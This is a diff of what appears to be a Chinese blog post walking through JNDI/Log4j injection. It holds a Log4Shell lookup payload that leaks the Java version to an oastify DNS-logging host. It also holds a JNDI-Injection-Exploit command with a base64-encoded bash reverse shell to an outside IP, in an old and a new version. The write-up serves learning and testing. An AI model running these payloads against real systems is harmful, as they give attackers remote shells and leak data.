@@ -244,12 +244,12 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/Java/" style="color: #03a9f4">Java</a>
+                <a href="/blog/tags/Java/" style="color: #00a596">Java</a>
             </span>
             
             <span class="tag">
                 
-                <a href="/blog/tags/CVE/" style="color: #ffa2c4">CVE</a>
+                <a href="/blog/tags/CVE/" style="color: #00bcd4">CVE</a>
             </span>
             
         </span>
@@ -548,12 +548,13 @@ factoryLocation  提供classes数据的地址可以是file/ftp/http协议
 <h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>用dnslog验证，给参数c传入payload，同时验证版本</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java">$<span class="token punctuation">&#123;</span>jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>$<span class="token punctuation">&#123;</span>sys<span class="token operator">:</span>java<span class="token punctuation">.</span>version<span class="token punctuation">&#125;</span><span class="token punctuation">.</span>pzsvx8i3vjkmt5jek36lwlh80z6pue<span class="token punctuation">.</span>oastify<span class="token punctuation">.</span>com<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<p>更多外带敏感信息参考：<a target="_blank" rel="noopener" href="https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html#JndiLookup">https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html#JndiLookup</a></p>
 <p><img src="/blog/2024/01/23/JNDI%E6%B3%A8%E5%85%A5/image-20240124173547326.png" alt="image-20240124173547326"></p>
 <p>回显则说明存在漏洞，版本是1.8.0_144，只有ldap注入</p>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>使用工具JNDI-Injection-Exploit.jar：<a target="_blank" rel="noopener" href="https://github.com/bkfish/Apache-Log4j-Learning/tree/main/tools">https://github.com/bkfish/Apache-Log4j-Learning/tree/main/tools</a></p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDI-Injection-Exploit.jar <span class="token parameter variable">-C</span> <span class="token string">"bash -c &#123;echo,YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMTUuMjM2LjE1My4xNzAvNTc3NDYgMD4mMQ%3D%3D&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span> <span class="token parameter variable">-A</span> <span class="token string">"192.168.134.128"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>使用工具JNDI-Injection-Exploit.jar：<a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDI-Injection-Exploit.jar <span class="token parameter variable">-C</span> <span class="token string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTUuMjM2LjE1My4xNzAvODAgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span> <span class="token parameter variable">-A</span> <span class="token string">"127.0.0.1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>然后我想了想这里我是不是得开三个内网穿透端口，nc一个，ldap一个，8180也要一个。。。寄（花生壳免费最多开两个）</p>
+<p>然后我想了想这里我是不是得开三个内网穿透端口，nc一个，ldap一个，还要给内网8180一个。。。寄（花生壳免费最多开两个）</p>
 
     </div>
     
